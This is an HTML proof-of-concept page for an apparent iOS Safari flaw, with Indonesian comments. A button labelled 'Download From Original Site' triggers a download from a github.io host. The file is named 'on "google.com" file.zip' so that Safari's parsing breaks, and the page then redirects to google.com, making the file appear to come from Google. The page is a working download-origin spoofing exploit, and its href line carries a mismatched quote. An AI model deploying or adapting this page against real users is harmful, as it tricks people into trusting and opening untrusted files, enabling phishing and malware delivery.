<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Safari iOS Download + Redirect PoC</title>

<style>
.button {
  background:#4CAF50;
  color:#fff;
  padding:14px 28px;
  font-size:16px;
  border:0;
  cursor:pointer;
}
</style>
</head>

<body>

<script>
function poc() {
  const a = document.createElement("a");

  // URL filename (normal)
  a.href = "https://ecdnts-del.github.io/test-apk/on "google.com" file.zip';

  // download filename (rusak parsing Safari)
  a.download = 'on "google.com" file.zip';

  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);

  // Redirect SETELAH download dipicu
  setTimeout(() => {
    window.location.replace("https://google.com");
  }, 2500); // 2â€“3 detik paling aman di iOS
}
</script>

<center>
  <button class="button" onclick="poc()">
    Download From Original Site
  </button>
</center>

</body>
</html>
